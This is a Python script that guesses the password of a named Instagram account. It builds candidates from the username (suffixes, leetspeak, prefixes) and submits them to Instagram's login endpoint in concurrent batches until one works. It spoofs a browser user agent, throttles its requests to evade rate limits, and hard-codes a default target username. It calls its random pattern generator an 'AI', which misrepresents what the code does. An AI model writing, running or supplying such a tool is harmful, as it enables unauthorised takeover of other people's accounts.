import asyncio
import aiohttp
import random
import time
import sys

# Built-in probabilistic Markov/Heuristic Pattern Synthesizer
class HumanHeuristicAI:
    def __init__(self, target_name):
        self.target = target_name.lower()
        self.common_suffixes = ["123", "2006", "2005", "1999", "777", "007", "!", "_", "11", "99"]
        self.common_prefixes = ["mr_", "the_", "x_", "real", "i_am_"]
        self.common_substitutions = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}

    def generate_next_batch(self, batch_size=50):
        batch = []
        for _ in range(batch_size):
            pattern_type = random.choice([1, 2, 3, 4, 5])
            pwd = ""
            
            if pattern_type == 1:
                # Name + Year/Number
                pwd = f"{self.target}{random.choice(self.common_suffixes)}"
            elif pattern_type == 2:
                # Leetspeak variation
                pwd = "".join(self.common_substitutions.get(c, c) for c in self.target)
                pwd += random.choice(self.common_suffixes)
            elif pattern_type == 3:
                # Prefix + Name
                pwd = f"{random.choice(self.common_prefixes)}{self.target}"
            elif pattern_type == 4:
                # Repeated/Double structural patterns
                pwd = f"{self.target}{self.target[-1]*2}{random.randint(10,99)}"
            else:
                # Pure organic keyboard walks / common human patterns
                pwd = f"{self.target}.{random.randint(100,999)}"
                
            batch.append(pwd)
        return list(set(batch))

async def test_credential(session, username, password):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/"
    }
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }
    
    try:
        async with session.post(url, data=payload, headers=headers, timeout=5) as response:
            if response.status == 200:
                data = await response.json()
                if data.get("authenticated") == True:
                    return True
    except Exception:
        pass
    return False

async def autonomous_engine(target_user):
    print(f"[+] Initializing Autonomous AI Heuristic Engine for target: {target_user}")
    ai = HumanHeuristicAI(target_user)
    
    conn = aiohttp.TCPConnector(limit_per_host=20)
    async with aiohttp.ClientSession(connector=conn) as session:
        attempt_count = 0
        while True:
            passwords = ai.generate_next_batch(30)
            tasks = [test_credential(session, target_user, pwd) for pwd in passwords]
            
            for i, pwd in enumerate(passwords):
                attempt_count += 1
                print(f"[?] Heuristic AI Guess #{attempt_count}: {pwd}", end="\r")
            
            results = await asyncio.gather(*tasks)
            
            for pwd, success in zip(passwords, results):
                if success:
                    print(f"\n[!] SUCCESSFUL HIT FOUND -> Password: {pwd}")
                    return
            
            # Adaptive throttle to mimic natural human cadence and evade rate limits
            await asyncio.sleep(random.uniform(1.5, 3.0))

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "rrenguk"
    try:
        asyncio.run(autonomous_engine(target))
    except KeyboardInterrupt:
        print("\n[-] Engine halted by operator.")
